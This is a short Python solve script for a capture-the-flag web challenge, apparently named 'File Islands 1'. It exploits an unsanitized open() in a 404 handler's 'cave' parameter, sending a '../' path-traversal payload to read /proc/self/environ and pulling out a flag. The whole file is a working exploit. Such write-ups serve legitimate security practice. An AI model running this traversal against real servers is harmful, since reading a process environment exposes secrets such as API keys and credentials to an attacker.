#!/usr/bin/env python3
# File Islands 1: the custom 404 handler opens `?cave=<path>` with a raw
# open() (no sanitization), giving a path-traversal primitive. Read
# /proc/self/environ, where the FLAG env var is exposed.
import os
import re
import requests

URL = os.environ.get("URL", "http://localhost:24303")

cave = "adventure/" + "../" * 12 + "proc/self/environ"
r = requests.get(f"{URL}/404", params={"cave": cave})
m = re.search(r"sun\{[^}]*\}", r.text)
print(m.group() if m else "NO FLAG FOUND:\n" + r.text[:500])
